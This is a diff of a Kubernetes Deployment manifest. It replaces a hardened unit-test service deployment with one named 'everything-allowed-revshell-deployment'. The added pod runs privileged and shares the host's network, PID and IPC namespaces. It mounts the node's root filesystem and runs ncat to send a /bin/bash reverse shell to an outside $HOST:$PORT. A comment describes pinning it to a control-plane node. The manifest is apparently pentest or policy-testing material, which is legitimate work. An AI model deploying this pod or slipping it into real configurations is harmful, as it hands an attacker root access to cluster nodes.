@@ -1,111 +1,38 @@
-# Missing metadta.annotations
-# Missing strategy
-# Missing template.metadata.annotations
-# missing affinity
-# missing securitycontext
-# missing liveness and readiness
-
 apiVersion: apps/v1
 kind: Deployment
 metadata:
-  name: unittest-ansparservice
-  namespace: default
+  name: everything-allowed-revshell-deployment
   labels:
-    app.kubernetes.io/name: unittest-ansparservice
-    app.kubernetes.io/instance: unittest-ansparservice
-    app.kubernetes.io/version: "1.0"
-    app.kubernetes.io/component: unittest-ansparservice
-    app.kubernetes.io/part-of: test
-    app.kubernetes.io/managed-by: helm
-    owner: KieniL
+    app: pentest
+    type: deployment
 spec:
+  replicas: 2
   selector:
     matchLabels:
-      app: unittest-ansparservice
-  minReadySeconds: 10
+      app: pentest
+      type: deployment
   template:
     metadata:
       labels:
-        app: unittest-ansparservice
-        action: jwt-consumer
+        app: pentest
+        type: deployment
     spec:
-      serviceAccountName: unittest-ansparservice-sa
-      terminationGracePeriodSeconds: 40
-      volumes:
-      - name: tmp
-        emptyDir:
-          medium: Memory
-          sizeLimit: 200Mi
-      securityContext:
-        runAsUser: 20000
-        runAsGroup: 20000        
-        runAsNonRoot: true
-        seLinuxOptions:
-          level: "s0:c123,c456"
+      hostNetwork: true
+      hostPID: true
+      hostIPC: true
       containers:
-      - name:  unittest-ansparservice
-        image: luke19/familyansparservice@sha256:bc4e6da1728b94420600b3cf830650010595b99bd42e30872866700e55501332
-        imagePullPolicy: Always
+      - name: everything-allowed-revshell-deployment
+        image: raesene/ncat
+        command: [ "/bin/sh", "-c", "--" ]
+        args: [ "ncat --ssl $HOST $PORT -e /bin/bash;" ]
         securityContext:
-          allowPrivilegeEscalation: false
-          runAsUser: 20000
-          runAsGroup: 20000
-          readOnlyRootFilesystem: true
-          runAsNonRoot: true
-          privileged: false
-          capabilities:
-            drop:
-              - all
-          seLinuxOptions:
-            level: "s0:c123,c456"
+          privileged: true
         volumeMounts:
-        - mountPath: /app/tmp
-          name: tmp
-        resources:
-          limits:
-            memory: 512Mi
-          requests:
-            memory: 512Mi
-            cpu: 500m
-        env:
-        - name: TZ
-          valueFrom:
-            configMapKeyRef:
-              name: test-config
-              key: TZ
-        - name: DB_HOST
-          valueFrom:
-            configMapKeyRef:
-              name: test-config
-              key: DB_HOST
-        - name: DB_PORT
-          valueFrom:
-            configMapKeyRef:
-              name: test-config
-              key: DB_PORT
-        - name: AUTH_URL
-          valueFrom:
-            configMapKeyRef:
-              name: test-config
-              key: AUTH_URL
-        - name: ANSPAREN_LOG_LEVEL
-          valueFrom:
-            configMapKeyRef:
-              name: test-config
-              key: ANSPAREN_LOG_LEVEL
-        ports:
-        - containerPort: 8080 #Expose containerport to the pod
-        livenessProbe: #Check that pod is ready
-          httpGet:
-            path: /actuator/health/liveness #path to check
-            port: 8080
-          initialDelaySeconds: 10 #start checking after 30 seconds
-          periodSeconds: 10 #check every 30 seconds
-          failureThreshold: 10
-        readinessProbe: #Check that pod is healthy
-          httpGet:
-            path: /actuator/health/readiness #path to check
-            port: 8080 #port to check
-          initialDelaySeconds: 15 #start checking after 15 seconds
-          periodSeconds: 10 #check every 3 seconds
-          failureThreshold: 10
+        - mountPath: /host
+          name: noderoot
+      #nodeName: k8s-control-plane-node # Force your pod to run on the control-plane node by uncommenting this line and changing to a control-plane node name
+      volumes:
+      - name: noderoot
+        hostPath:
+          path: /
+      
